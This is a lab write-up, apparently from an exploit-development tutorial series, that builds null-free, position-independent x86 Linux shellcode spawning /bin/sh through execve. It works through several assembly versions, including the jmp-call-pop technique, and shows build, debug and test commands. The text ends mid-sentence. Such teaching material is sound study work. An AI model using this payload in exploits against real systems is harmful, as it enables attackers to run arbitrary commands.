### Info
In this lab, we'll create a shellcode that spawns a shell<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS, ASLR enabled<br>
**Keywords**: shellcode

### Implementation
Getting a command shell on target system allows you to execute arbitrary command, therefore it's one of the most important security flaws.
We'll be using `execve` system call

#### Intro
The `execve` syscall has the following signature and used as the following:
```
int execve(const char *filename, char *const argv[], char *const envp[]);
```
The first parameter is the path of executable.Second parameter is the command line arguments for this executable.
The third parameter is the environment parameters to be passed to the executable.
It's used in a C program as the following.
```
int main(void)
{
  char *arg[2];
  arg[0] = "/bin/sh";
  arg[1] = NULL;
  execve("/bin/sh", arg, NULL);
}
```
#### Initial code
The initial code does not follow shellcode requirements (null bytes, position dependency), but we must have a working starting
point to improve. 
* The syscall number is 11 as shown below and assigned to $eax
```
uzi@pwnpatrol:$ grep execve /usr/include/asm/unistd*.h
/usr/include/asm/unistd_32.h:#define __NR_execve 11
```
* Path of executable is `/bin/sh`, its address is assigned to $ebx
* Address of argv address array is prepared in the lines `mov ecx,0 ... mov ecx, esp`  assigned to $ecx
* Environment variables is null and assigned to $edx
```
section .data
cmd db '/bin/sh',0x0
section .text
global _start
_start:
;execve("/bin/sh",{"bin/sh", NULL}, NULL)
mov eax, 11
mov ebx, cmd
mov ecx, 0
push ecx
push ebx
mov ecx, esp
mov edx,0
int 0x80
```
We test this code and be sure that it works
```
uzi@pwnpatrol:$ nasm -f elf shellcode.asm
uzi@pwnpatrol:$ ld -m elf_i386 -o shellcode shellcode.o
uzi@pwnpatrol:$ ./shellcode 
$ ls
build.sh  shellcode  shellcode.asm  shellcode.
```
Until we are sure that shellcode works as expected, we may create elf executable from it and debug if necessary.
In the final step, we'll create a flat binary from it. Here is how debug works.
```
uzi@pwnpatrol:$ gdb -q shellcode
Reading symbols from shellcode...(no debugging symbols found)...done.
(gdb) b _start 
Breakpoint 1 at 0x8048060
(gdb) r
Starting program: /home/uzi/exploit_labs/lab6_really_shellcode/shellcode 
Breakpoint 1, 0x08048060 in _start ()
(gdb) disassemble $eip
Dump of assembler code for function _start:
=> 0x08048060 <+0>:    ....
```

#### Increment 1: Simplifying
Well, this may not be possible for some systems, but in my system, execve works if argv passed as null.
```
section .data
cmd db '/bin/sh',0x0
section .text
global _start
_start:
;execve("/bin/sh", NULL, NULL)
mov eax, 11
mov ebx, cmd
mov ecx, 0
mov edx,0
int 0x80
```

#### Increment 2: Position independency
We remove the data section and push the null terminated "/bin/sh" to the stack.
```
section .text
global _start
_start:
;execve("/bin/sh", NULL, NULL)
push 0x0068732f
push 0x6e69622f
mov eax, 11
mov ebx, esp
mov ecx, 0
mov edx, 0
int 0x80
```

#### Increment 3: Getting rid of nulls
We use xor to zero the registers and use only the 8bit part of eax to assign 11 to it.<br/>
Additionally, observe that null terminator removed from the first push. Instead a junk byte written there, and later that byte is set to
zero with `mov [esp+7], al`.

```
section .text
global _start
_start:
xor eax,eax
xor ecx,ecx
xor edx,edx
;execve("/bin/sh", NULL, NULL)
push 0x4168732f
push 0x6e69622f
mov [esp+7], al
mov al, 11
mov ebx, esp
int 0x80
```
As there are no more null bytes, we can try to execute shellcode using our shellcode harness from previous labs.<br/>
Just replace the following lines with `[bits 32]` and create a flat binary.
```
section .text
global _start
_start:
```
Test. Yep we see that it works.
```
uzi@pwnpatrol:$ nasm shellcode.asm 
uzi@pwnpatrol:$ ../lab4_shellcode_harness/shellcode_harness `cat shellcode`
$
```

#### Increment 4: Adding some creativity
For null termination, we used `mov [esp+7], al`. It yields 4 bytes as you can quickly check with https://defuse.ca/online-x86-assembler.htm
What if we use an extra slash in the beginning of `/bin/sh`. For linux file paths, the extra slash means nothing and silently ignored. So we push now `//bin/sh`. It's exactly 8 bytes and we add null terminator with a preceding `push eax`.
```
push eax
push 0x68732f6e
push 0x69622f2f
```

#### Increment ?: jmp-call-pop technique
This is not an increment but another way to address the data in shellcodes, called as jmp-call-pop technique.<br/>
We know that:
* `jmp` instruction jumps to the given location
* `call` instruction pushes the address of next instruction (what is the next one is not an instruction?, see answer below) to stack jumps to the given location
* `pop` pops data pointed by $esp
So this combination can be used to address a data location as shown below. The trick is to put the data we want to address after the `call`. when `call string_loader_ret` is executed, it'll push the address whatever it comes after the itself (so not only limited to
instruction), to the stack. Finally when we `pop ebx` we get the address of data.
```
[bits 32]
xor eax,eax
xor ecx,ecx
xor edx,edx
;execve("/bin/sh", NULL, NULL)
jmp string_loader
string_loader_ret:
pop ebx
mov [ebx+7],al
mov al, 11
int 0x80
string_loader:
call string_loader_ret
db '/bin/shX'
```

Two questions that may arise here?
* We try to create position independent code? Isn't `call` references an absolute address?<br/>
An instruction in x86 may have only a single responsibility but it may have different modes, and different modes may have different opcodes. So the `call` has the following modes (two new 64bit related not shown). Since the target address is very near, assembler uses relative addressing in our case and this fits to our requirements. You can even tell to nasm to use 

| Opcode | Mnemonic      | Description                                                    |
|--------|---------------|----------------------------------------------------------------|
| E8 cw  | CALL rel16    | Call near, relative, displacement relative to next instruction |
| E8 cd  | CALL rel32    | Call near, relative, displacement relative to next instruction |
| FF /2  | CALL r/m16    | Call near, absolute indirect, address given in r/m16           |
| FF /2  | CALL r/m32    | Call near, absolute indirect, address given in r/m32           |
| 9A cd  | CALL ptr16:16 | Call far, absolute, address given in operand                   |
| 9A cp  | CALL ptr16:32 | Call far, absolute, address given in operand                   |
| FF /3  | CALL m16:16   | Call far, absolute indirect, address given in m16:16           |
| FF /3  | CALL m16:32   | Call far, absolute indirect, address given in m16:32           |

* The other question
